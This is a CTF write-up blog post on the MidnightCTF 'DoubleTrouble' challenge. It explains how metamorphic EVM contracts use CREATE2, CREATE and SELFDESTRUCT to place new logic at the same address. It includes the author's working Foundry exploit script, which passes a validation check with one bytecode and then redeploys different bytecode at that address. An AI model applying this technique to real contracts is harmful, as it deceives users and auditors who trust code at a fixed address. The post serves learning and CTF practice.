---
title: Illusion of Immutability
published: 2025-04-14
description: MidnightCTF, how evm smart contracts can be redeployed at the same address with different logic using CREATE2, CREATE, and SELFDESTRUCT.
image: ''
tags: ['evm', 'ctf', 'CREATE2', 'SELFDESTRUCT']
category: 'wu'
draft: false 
lang: 'en'
---

# Introduction

The final web3 challenge of the Midnight CTF revolves around a metamorphic contract. Fortunately, I had previously created a similar challenge for the Breizh CTF two years ago.

Here's a quick refresher on what a metamorphic contract is:

Smart contracts on Ethereum are widely considered immutable once deployed. However, this assumption doesn’t always hold true. In a this article by MixBytes, titled [*Metamorphic Smart Contracts: Is EVM Code Truly Immutable?*](https://mixbytes.io/blog/metamorphic-smart-contracts-is-evm-code-truly-immutable#rec562912282), the author dives into a class of contracts whose logic can *change over time*, despite having a static address.



## MixBytes TL;DR

Despite the common belief that smart contracts on Ethereum are immutable once deployed, **contracts can effectively change their logic** using advanced EVM patterns involving `CREATE`, `CREATE2`, and `SELFDESTRUCT`.


### Core Mechanism

#### EVM Contract Creation Ops:
In the Ethereum Virtual Machine (EVM), contracts are deployed using one of two opcodes:

- `CREATE`
- `CREATE2`

Both create a **new contract** on-chain, but the address where the contract is deployed differs between them.

---

#### **`CREATE` – Classic Deployment**

- **Usage:** 
```solidity
address = keccak256(rlp([sender, nonce]))[12:]
```
- **Key Variables:**
  - `sender`: the address creating the contract
  - `nonce`: the transaction count of the sender

**Important traits:**
- The address depends on the sender’s *current nonce*.
- Nonce **increments** with each contract creation, making the resulting address different for each txs.
- **Cannot redeploy** to the same address, unless the nonce is reset (e.g., via `SELFDESTRUCT`).

##### Why it's relevant to metamorphic contracts:
By using `SELFDESTRUCT`, a contract can erase itself and reset its nonce (if no further txs), allowing **`CREATE` to generate the same contract address again** with different code.

---

#### **`CREATE2` – Deterministic Deployment**

- **Usage:**  
  ```solidity
  address = keccak256(0xFF ++ sender ++ salt ++ keccak256(bytecode))[12:]
  ```
- **Key Variables:**
  - `sender`: deploying contract address
  - `salt`: 32-byte user-defined value
  - `bytecode`: init code of the contract being deployed

**Important traits:**
- Fully **deterministic** — given the same inputs, the contract will always deploy to the same address.
- Can be **redeployed** to the *same address*, *if the original contract was removed* (e.g., via `SELFDESTRUCT`).

#### Why it's relevant to metamorphic contracts:
- `CREATE2` is used to deploy a wrapper at a fixed address.
- That wrapper then uses `CREATE` to deploy the mutable logic.
- After destructing both the logic and the deployer, the same deployer can be re-deployed with `CREATE2`, enabling a **new logic contract** at the same fixed address.

---

### 🧬 Combined Flow — Step-by-Step:

| Step | Action | Purpose |
|------|--------|---------|
| 1 | Use `CREATE2` to deploy a `MutDeployer` contract at a fixed address | Enables predictable future redeployments |
| 2 | `MutDeployer` uses `CREATE` to deploy `MutableV1` | First version of the logic contract |
| 3 | Users interact with `MutableV1` at a known address | Appears immutable |
| 4 | Owner calls `SELFDESTRUCT` on `MutableV1` | Clears the address |
| 5 | Owner calls `SELFDESTRUCT` on `MutDeployer` | Resets its nonce, makes redeployment possible |
| 6 | Use `CREATE2` with same salt and bytecode to redeploy `MutDeployer` | Back to same address |
| 7 | `MutDeployer` uses `CREATE` to deploy `MutableV2` | New logic at same address as `MutableV1` |
| ✅ | Result: Different contract logic at the same address | Mutation complete, user unaware unless deeply inspecting |

## Official WU
You can find the official challenge write-up here:  
👉 [DoubleTrouble on NeoReo Blog](https://blog.neoreo.fr/posts/doubletrouble/)



## My foundry script solution

Below is the script I used to solve the challenge. You can execute it using:

`forge script script/Exploitoor.s.sol:ExploitScript --fork-url $RPC_URL --private-key $PRIVATE_KEY --broadcast`

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/chall.sol";

contract ExploitScript is Script {

    DoubleTrouble dt;
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        dt = DoubleTrouble(0x39dD11C243Ac4Ac250980FA3AEa016f73C509f37);

        Atomic a = new Atomic(address(dt));

        a.step1();

        //  Bypass the foundry local simulation error with slefdestruct not apply
        address(a).call(abi.encodeWithSignature("step2()"));

        // For some reason, when this tx is executed the `isSolved` var state is not yet updated to true
        // which is unexpected, because `step2()` set the var to true by solving the challenge =(
        (, bytes memory data) = address(dt).call(abi.encodeWithSignature("isSolved()"));
        bool s = abi.decode(data, (bool));
        console2.log(s);

        vm.stopBroadcast();
    }
}

contract Atomic {

    DoubleTrouble dt;

    constructor(address _dt) {
        dt = DoubleTrouble(_dt);
    }

    function step1() public  returns(address s1) {
        Deployer dp = new Deployer{salt : bytes32(hex"1234")}();

        s1 = dp.deploy1();

        dt.validate(s1);

        s1.call("");
        
        dp.destroy();
    }

    function step2() public returns (address s2) {
        Deployer dp = new Deployer{salt : bytes32(hex"1234")}();

        s2 = dp.deploy2();

        dt.flag(s2);
    }
}

contract Deployer{
    function deploy1() public returns(address){
        bytes memory x = hex"5fff";
        return address(new OurBytecode(x));
    }

    function deploy2() public returns (address){
        bytes memory x = hex"1f1a99ed17babe0000f007b4110000ba5eba110000c0ffee";
        return address(new OurBytecode(x));
    }

    function destroy() public {
        selfdestruct(payable(address(0x0)));
    }
}
contract OurBytecode{
    constructor(bytes memory code){assembly{return (add(code, 0x20), mload(code))}}
}
```